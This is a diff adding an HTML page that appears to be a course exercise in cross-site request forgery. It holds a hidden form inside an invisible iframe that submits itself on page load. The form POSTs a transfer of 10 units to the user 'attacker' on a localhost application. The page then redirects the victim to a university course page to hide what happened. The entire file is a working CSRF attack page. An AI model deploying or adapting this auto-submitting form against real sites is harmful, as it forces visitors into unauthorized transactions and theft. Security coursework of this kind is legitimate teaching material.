@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<iframe id="invisible" name="invisible" style="display:none;"></iframe>
+<form action="http://localhost:3000/post_transfer" method="POST" target="invisible">
+    <input type="hidden" name="destination_username" value="attacker"/>
+    <input type="hidden" name="quantity" value="10"/>
+</form>
+
+<script>
+    console.log("here1")
+    document.forms[0].submit();
+    console.log("here2")
+
+    setTimeout(function () {
+        location.href = 'http://sharif.edu/~kharrazi/courses/40441-001/'
+    }, 100);
+</script>
+<!--<p>Attack html</p>-->
+<p>Redirecting</p>
+</body>
+</html>
